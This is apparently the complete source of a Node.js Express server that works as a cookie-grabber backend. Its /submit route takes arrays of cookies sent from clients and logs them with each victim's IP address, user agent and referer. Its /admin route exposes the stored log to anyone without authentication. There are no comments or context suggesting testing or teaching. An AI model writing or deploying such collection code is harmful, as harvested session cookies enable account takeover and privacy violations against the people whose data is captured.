const express = require('express');
const fs = require('fs');
const path = require('path');
require('colors');

const app = express();

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files from a public directory
app.use(express.static('public'));

// Helper function to log data to log.json
function logToFile(data) {
  // Structure each log entry according to your required format
  const logEntry = {
    ip: data.ip,
    date: new Date().toLocaleString(), // Include the date in the log entry
    cookies: data.cookies || [], // Store the cookies array
    basicInfo: data.info, // Basic info about the request
  };

  let logs = [];

  // Read existing logs from log.json
  if (fs.existsSync('log.json')) {
    const existingData = fs.readFileSync('log.json', 'utf8');
    try {
      logs = JSON.parse(existingData);
    } catch (e) {
      console.error('Error parsing existing log.json:', e);
    }
  }

  // Append new log entry
  logs.push(logEntry);

  // Write back to log.json
  fs.writeFileSync('log.json', JSON.stringify(logs, null, 2), 'utf8');
}

// POST route to receive cookies and info
app.post('/submit', (req, res) => {
  // Get client IP address
  const clientIp = req.ip || req.socket.remoteAddress;

  const cookies = req.body.data || []; // Ensure this is an array of objects
  const basicInfo = {
    userAgent: req.headers['user-agent'],
    referer: req.headers['referer'] || 'No referer', // Capture the referer
  };

  // Structure logData with the required fields
  const logData = {
    ip: clientIp,
    cookies: cookies, // Send cookies as an array of objects
    info: basicInfo,
  };

  // Log to file
  logToFile(logData);

  // Respond to client
  res.json({ message: 'Data logged successfully.' });
});

// GET route to display log content
app.get('/admin', (req, res) => {
  fs.readFile('./log.json', 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Error reading JSON file');
    }

    try {
      const jsonData = JSON.parse(data);
      res.json(jsonData);
    } catch (parseErr) {
      console.error(parseErr);
      return res.status(500).send('Error parsing JSON file');
    }
  });
});

// GET route for the UI
app.get('/ui', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(3003, () => {
  console.clear();
  console.log('App listening on port 3003'.magenta.bold);
});
